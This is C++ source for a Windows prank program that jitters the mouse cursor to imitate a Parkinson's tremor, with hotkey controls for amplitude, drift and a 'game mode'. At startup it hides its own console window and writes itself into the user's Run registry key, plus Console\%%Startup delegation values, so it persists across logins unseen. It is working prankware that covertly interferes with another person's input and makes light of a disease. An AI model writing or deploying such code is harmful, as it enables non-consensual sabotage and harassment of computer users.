//////////////////////////////////////////////////
///                                            ///
///  Copyright (c) 2024 Do Potato Studios      ///
///                                            ///
//////////////////////////////////////////////////

#include <Windows.h>
#include <random>
#include <vector>
#include <filesystem>
#include <iostream>


int coolDown;

int x = 0;
int y = 0;
int random = 10;
int delay = 1;
POINT point{};

bool drift = true;
bool enabled = false;
bool gameMode = false;
bool realistic = false;

bool start_down = true;
bool drift_down = true;
bool realistic_down = true;
bool up_down = true;
bool down_down = true;
bool game_down = true;
bool speedUp_down = true;
bool speedDown_down = true;
bool show_down = true;

bool shift_down = true;
bool ctrl_down = true;

bool updated = true;


bool showConsole = false;

void MouseMoveAbsolute( INPUT* buffer, float x, float y )
{
	buffer->mi.dx = ( x * ( ( 0xFFFF ) / 1920 ) );
	buffer->mi.dy = ( y * ( ( 0xFFFF ) / 1080 ) );
	//buffer->mi.dy = y;
	//buffer->mi.dx = x;
	buffer->mi.dwFlags = ( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE );

	SendInput( 1, buffer, sizeof( INPUT ) );
}
void MouseSetup( INPUT* buffer )
{
	buffer->type = INPUT_MOUSE;
	buffer->mi.dx = ( 0 * ( 0xFFFF / 1920 + 1 ) );
	buffer->mi.dy = ( 0 * ( 0xFFFF / 1080 + 1 ) );
	buffer->mi.mouseData = 0;
	buffer->mi.dwFlags = MOUSEEVENTF_ABSOLUTE;
	buffer->mi.time = 0;
	buffer->mi.dwExtraInfo = 0;
}

bool input( int _key, bool& _down )
{
	BYTE keyboardState[ 256 ];
	GetKeyboardState( keyboardState );

	if( keyboardState[ _key ] & 255 )
	{
		printf( "YES!\n" );
	}

	if( GetAsyncKeyState( _key ) && !_down )
	{
		_down = true;
		updated = true;
		return true;
	}
	else if( !GetAsyncKeyState( _key ) )
	{
		_down = false;
	}
	return false;
}

void printSettings()
{
	system( "cls" );

	//printf("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ \n" );
	//printf("░       ░░░░      ░░░       ░░░  ░░░░  ░░        ░░   ░░░  ░░░      ░░░░      ░░░░      ░░░░      ░░░   ░░░  ░░░      ░░ \n" );
	//printf("▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒  ▒▒▒▒▒▒  ▒▒▒▒▒    ▒▒  ▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒    ▒▒  ▒▒  ▒▒▒▒▒▒▒ \n" );
	//printf("▓       ▓▓▓  ▓▓▓▓  ▓▓       ▓▓▓     ▓▓▓▓▓▓▓▓  ▓▓▓▓▓  ▓  ▓  ▓▓  ▓▓▓   ▓▓▓      ▓▓▓▓      ▓▓▓  ▓▓▓▓  ▓▓  ▓  ▓  ▓▓▓      ▓▓ \n" );
	//printf("█  ████████        ██  ███  ███  ███  ██████  █████  ██    ██  ████  ████████  ████████  ██  ████  ██  ██    ████████  █ \n" );
	//printf("█  ████████  ████  ██  ████  ██  ████  ██        ██  ███   ███      ████      ████      ████      ███  ███   ███      ██ \n" );
	//printf("████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████ \n" );

	printf( "   (                                                    (                       \n" );
	printf( "   )\\ )                   )                             )\\ )                      \n" );
	printf( "  (()/(      )   (     ( /(   (            (  (        (()/(                      \n" );
	printf( "   /(_))  ( /(   )(    )\\())  )\\    (      )\\))(   (    /(_))   (     (      (    \n" );
	printf( "  (_))    )(_)) (()\\  ((_)\\  ((_)   )\\ )  ((_))\\   )\\  (_))     )\\    )\\ )   )\\   \n" );
	printf( "  | _ \\  ((_)_   ((_) | |(_)  (_)  _(_/(   (()(_) ((_) / __|   ((_)  _(_/(  ((_)  \n" );
	printf( "  |  _/  / _` | | '_| | / /   | | | ' \\)) / _` |  (_-< \\__ \\  / _ \\ | ' \\)) (_-<  \n" );
	printf( "  |_|    \\__,_| |_|   |_\\_\\   |_| |_||_|  \\__, |  /__/ |___/  \\___/ |_||_|  /__/  \n" );

	printf( "\n[ Shift + Ctrl ] + [ KEY ]\n\n" );
	printf( "[ 1/2 ] : Amplitude:----- %i \n", random );
	printf( "[ 3/4 ] : Delay: -------- %i \n", delay );

	if( enabled )
		printf( "[  P  ] : Parkinson's: -- ON \n" );
	else
		printf( "[  P  ] : Parkinson's: -- OFF \n" );

	if( drift )
		printf( "[  D  ] : Drift: -------- ON \n" );
	else
		printf( "[  D  ] : Drift: -------- OFF \n" );

	if( gameMode )
		printf( "[  G  ] : Game Mode: ---- ON \n" );
	else
		printf( "[  G  ] : Game Mode: ---- OFF \n" );

	if( realistic )
		printf( "[  R  ] : Realistic Mode: ON \n" );
	else
		printf( "[  R  ] : Realistic: ---- OFF \n" );
	printf( "\n[ Shift + Ctrl ] + [ KEY ]\n" );
}

void allInput()
{
	input( VK_SHIFT, shift_down );
	input( VK_CONTROL, ctrl_down );

	if( !shift_down || !ctrl_down )
		return;

	if( input( 'P', start_down ) )
	{
		enabled = !enabled;
		return;
	}


	if( input( 'D', drift_down ) )
	{
		drift = !drift;
		return;
	}
	if( input( 'G', game_down ) )
	{
		gameMode = !gameMode;
		return;
	}
	if( input( 'R', realistic_down ) )
	{
		realistic = !realistic;
		return;
	}


	if( input( '2', up_down ) )
	{
		random++;
		return;
	}
	if( input( '1', down_down ) )
	{
		random--;
		if( random == 0 )
			random = 1;
		return;
	}


	if( input( '4', speedUp_down ) )
	{
		delay++;
		return;
	}
	if( input( '3', speedDown_down ) )
	{
		delay--;
		if( delay < 0 )
			delay = 0;
		return;
	}
	if( input( 'S', show_down ) )
	{
		showConsole = !showConsole;
		if( showConsole )
			ShowWindow( GetConsoleWindow(), SW_SHOW );
		else
			ShowWindow( GetConsoleWindow(), SW_HIDE );

		return;
	}
}

int StringToWString( std::wstring& ws, const std::string& s )
{
	std::wstring wsTmp( s.begin(), s.end() );

	ws = wsTmp;

	return 0;
}

void setOnStratup()
{
	WCHAR ownPth[ MAX_PATH ];
	// When NULL is passed to GetModuleHandle, the handle of the exe itself is returned
	HMODULE hModule = GetModuleHandle( NULL );
	if( hModule != NULL )
	{
		// Use GetModuleFileName() with module handle to get the path
		GetModuleFileName( hModule, ownPth, ( sizeof( ownPth ) ) );

		std::wstring progPath( ownPth );
		HKEY hkey = NULL;
		LONG createStatus = RegCreateKey( HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey ); //Creates a key
		RegSetValueEx( hkey, L"ParkingsSon", 0, REG_SZ, ( BYTE* )progPath.c_str(), ( progPath.size() + 1 ) * sizeof( wchar_t ) );
		
		std::string  keyFanny = "{B23D10C0-E52E-411E-9D5B-C09FDF709C7D}";
		std::wstring keyFunny;
		StringToWString( keyFunny, keyFanny );
		HKEY hkey2 = NULL;
		RegOpenKey(HKEY_CURRENT_USER, L"Console\\%%Startup", &hkey2);
		RegSetValueEx( hkey2, L"DelegationConsole", 0, REG_SZ, ( BYTE* )keyFunny.c_str(), ( size_t )38 * sizeof(wchar_t));
		RegSetValueEx( hkey2, L"DelegationTerminal", 0, REG_SZ, ( BYTE* )keyFunny.c_str(), ( size_t )38 * sizeof( wchar_t ) );
		return;
	}


	/*[HKEY_CURRENT_USER\Console\ % %Startup]
		"DelegationConsole" = "{B23D10C0-E52E-411E-9D5B-C09FDF709C7D}"
		"DelegationTerminal" = "{B23D10C0-E52E-411E-9D5B-C09FDF709C7D}"*/
}

int main()
{
	setOnStratup();
	ShowWindow( GetConsoleWindow(), SW_HIDE );
	while( true )
	{
		allInput();
		for( size_t i = 0; i < delay; i++ )
		{
			allInput();

			if( updated )
			{
				updated = false;
				printSettings();
			}

			Sleep( 1 );
		}

		if( !enabled )
			continue;

		POINT newPos;
		GetCursorPos( &newPos );
		newPos.x -= x;
		newPos.y -= y;

		if( realistic )
		{
			if( point.x == newPos.x && point.y == newPos.y )
				continue;
		}
		point = newPos;

		if( !gameMode )
		{
			if( drift )
			{
				x += std::rand() % random * 2 - random + 1;
				y += std::rand() % random * 2 - random + 1;
			}
			else
			{
				x = std::rand() % random * 2 - random + 1;
				y = std::rand() % random * 2 - random + 1;
			}
			SetCursorPos( point.x + x, point.y + y );
		}
		else
		{
			if( drift )
			{
				x += std::rand() % random * 2 - random + 1;
				y += std::rand() % random * 2 - random + 1;
			}
			else
			{
				x = std::rand() % random * 2 - random + 1;
				y = std::rand() % random * 2 - random + 1;
			}
			INPUT buffer[ 1 ];
			MouseSetup( buffer );
			MouseMoveAbsolute( buffer, 1920 / 2 + x * 0.01f, 1080 / 2 + y * 0.01f );
		}
	}
};